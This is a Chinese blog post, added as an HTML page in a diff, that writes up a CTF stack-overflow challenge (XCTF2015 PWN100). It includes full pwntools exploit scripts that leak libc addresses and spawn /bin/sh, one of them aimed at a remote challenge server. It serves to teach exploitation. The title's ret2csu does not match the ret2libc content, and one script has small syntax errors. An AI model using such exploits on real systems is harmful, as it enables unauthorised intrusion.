@@ -1,0 +1,333 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>【PWN】Linux栈溢出——ret2csu（XCTF2015-PWN100) | Limpid</title>
+<link rel="shortcut icon" href="https://limpid94.github.io/favicon.ico?v=1645002667970">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://limpid94.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="【PWN】Linux栈溢出——ret2csu（XCTF2015-PWN100) | Limpid - Atom Feed" href="https://limpid94.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="程序逆向及漏洞分析
+main函数的内容如下：
+int __cdecl main()
+{
+  char buf[108]; // [esp+2Ch] [ebp-6Ch] BYREF
+
+  strcpy(buf, &quot;Welcome t..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://limpid94.github.io">
+  <img class="avatar" src="https://limpid94.github.io/images/avatar.png?v=1645002667970" alt="">
+  </a>
+  <h1 class="site-title">
+    Limpid
+  </h1>
+  <p class="site-description">
+    Keep thinking , keeping learning
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              【PWN】Linux栈溢出——ret2csu（XCTF2015-PWN100)
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-09-23
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h2 id="程序逆向及漏洞分析">程序逆向及漏洞分析</h2>
+<p>main函数的内容如下：</p>
+<pre><code class="language-c">int __cdecl main()
+{
+  char buf[108]; // [esp+2Ch] [ebp-6Ch] BYREF
+
+  strcpy(buf, &quot;Welcome to XDCTF2015~!\n&quot;);
+  memset(&amp;buf[24], 0, 0x4Cu);
+  setbuf(stdout, buf);
+  write(1, buf, strlen(buf));
+  sub_8048484();
+  return 0;
+}
+</code></pre>
+<pre><code class="language-c">ssize_t sub_8048484()
+{
+  char buf[108]; // [esp+1Ch] [ebp-6Ch] BYREF
+
+  setbuf(stdin, buf);
+  return read(0, buf, 0x100u);
+}
+</code></pre>
+<p>可以看到在sub_8048484中read函数读入0x100大小的字符，而buf只有108个字符，因此猜测存在栈溢出。</p>
+<h2 id="安全检查">安全检查</h2>
+<figure data-type="image" tabindex="1"><img src="https://limpid94.github.io/post-images/1632371042409.PNG" alt="" loading="lazy"></figure>
+<h2 id="偏移计算">偏移计算</h2>
+<p>从sub_8048484函数的buf长度时108可以知道，padding长度位108+fack_ebp(4) = 112</p>
+<h2 id="构造exp">构造EXP</h2>
+<h3 id="方法一使用ret2libc的常见思路">方法一：使用ret2libc的常见思路</h3>
+<p>这里使用正常的ROP思路：<br>
+第一步：泄露write函数的地址<br>
+第二步：通过write函数的地址使用LibcSearcher查找对应的libc版本<br>
+第三步：计算libc基址<br>
+第四步：计算出system函数和read函数的的真实地址<br>
+第五步：先使用read函数将/bin/sh函数读入bss段中，再将其送入system函数中<br>
+因此完整的exp如下：</p>
+<pre><code class="language-python"># coding:utf-8
+
+from pwn import * 
+from LibcSearcher import *
+
+# context.log_level = 'debug'
+p = process(&quot;./xctf2015pwn200&quot;))
+elf = ELF(&quot;./xctf2015pwn200&quot;)
+
+main_addr = 0x080484BE
+write_got = elf.got['write']
+write_plt = elf.plt['write']
+read_got = elf.got['read']
+read_plt = elf.plt['read']
+bss_addr = elf.bss()+0x100
+pop_ebx_addr = 0x0804836c
+
+
+log.success('  main_addr ==&gt; '+ hex(main_addr))
+log.success('  write_got ==&gt; '+ hex(write_got))
+log.success('  write_plt ==&gt; '+ hex(write_plt))
+log.success('  read_got ==&gt; '+ hex(read_got))
+log.success('  read_plt ==&gt; '+ hex(read_plt))
+log.success('  bss_addr ==&gt; '+ hex(bss_addr))
+
+
+# Using normal ROP
+##*********************************************
+## leaking write address to search libc version.
+##*********************************************
+payload = b'A'*112  
+payload += p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
+p.recvuntil('!\n')
+p.send(payload)
+write_addr = u32(p.recv(4))
+log.success('write_addr ==&gt; '+hex(write_addr))
+
+payload = b'A'*112 
+payload += p32(write_plt) + p32(main_addr) + p32(1) + p32(read_got) + p32(4) p.recvuntil('!\n')
+p.send(payload)
+read_addr = u32(p.recv(4))
+log.success('read_addr ==&gt; '+hex(read_addr))
+
+libc = LibcSearcher('write',write_addr)
+libc.add_condition('read',read_addr)
+
+libc_base = write_addr - libc.dump('write')
+log.success('libc_base ==&gt; '+hex(libc_base))
+gets_addr = libc_base + libc.dump('gets')
+log.info('gets_addr ===&gt; '+hex(gets_addr))
+system_addr = libc_base + libc.dump('system')
+log.info('system_addr ===&gt; '+hex(system_addr))
+##******************************************************************
+## read /bin/sh into bss segment area and use system to execute it
+##******************************************************************
+read_addr = libc_base + libc.dump('read')
+log.success('read_addr ==&gt; '+hex(read_addr))
+payload = b'A'*112 
+payload += p32(read_addr) + p32(system_addr) + p32(0) + p32(bss_addr) + p32(8)
+payload += p32(bss_addr) + p32(0xdeadbeef) + p32(bss_addr)
+p.recvuntil('!\n')
+p.send(payload)
+p.sendline('/bin/sh\x00')
+
+p.interactive()
+</code></pre>
+<p>在本地复现成功了<br>
+<img src="https://limpid94.github.io/post-images/1632371993642.PNG" alt="" loading="lazy"><br>
+但是在远程环境下就复现失败了：<br>
+<img src="https://limpid94.github.io/post-images/1632372027668.PNG" alt="" loading="lazy"><br>
+原因是没办法使用LibcSearcher找到远端使用的libc.因此改用DynELF</p>
+<pre><code class="language-python">#coding:utf-8
+from pwn import *
+
+# context.log_level = 'debug'
+# r = process('./xctf2015pwn200')
+r = remote('111.200.241.244', 57161)
+elf = ELF('./xctf2015pwn200')
+
+main_addr = 0x080484BE
+write_got = elf.got['write']
+write_plt = elf.plt['write']
+read_got = elf.got['read']
+read_plt = elf.plt['read']
+bss_addr = elf.bss()+0x100
+
+log.success('  main_addr ==&gt; '+ hex(main_addr))
+log.success('  write_got ==&gt; '+ hex(write_got))
+log.success('  write_plt ==&gt; '+ hex(write_plt))
+log.success('  read_got ==&gt; '+ hex(read_got))
+log.success('  read_plt ==&gt; '+ hex(read_plt))
+log.success('  bss_addr ==&gt; '+ hex(bss_addr))
+
+def leak(address):
+    payload0 = 'A'*112
+    payload0 += p32(write_plt) + p32(0x80483d0) + p32(1) + p32(address) + p32(4)
+    r.recvuntil('!\n')
+    r.send(payload0)
+    data = r.recv(4)
+    return data
+d = DynELF(leak,elf = ELF('xctf2015pwn200'))
+system_addr = d.lookup('system','libc')
+log.success(' system_addr ==&gt; '+hex(system_addr))
+
+log.info(' Start to getshell ... ')
+payload = 'A'*112
+payload += p32(read_plt) + p32(system_addr) + p32(0) + p32(bss_addr) + p32(8) + p32(0xdeadbeef) + p32(bss_addr)
+r.recvuntil('!\n')
+r.send(payload)
+r.send('/bin/sh\x00')
+
+r.interactive()
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E7%A8%8B%E5%BA%8F%E9%80%86%E5%90%91%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">程序逆向及漏洞分析</a></li>
+<li><a href="#%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5">安全检查</a></li>
+<li><a href="#%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97">偏移计算</a></li>
+<li><a href="#%E6%9E%84%E9%80%A0exp">构造EXP</a>
+<ul>
+<li><a href="#%E6%96%B9%E6%B3%95%E4%B8%80%E4%BD%BF%E7%94%A8ret2libc%E7%9A%84%E5%B8%B8%E8%A7%81%E6%80%9D%E8%B7%AF">方法一：使用ret2libc的常见思路</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://limpid94.github.io/post/pwn-linux-zhan-yi-chu-ret2csu/">
+              <h3 class="post-title">
+                【PWN】Linux栈溢出——ret2csu
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by Limpid .
+  <a class="rss" href="https://limpid94.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
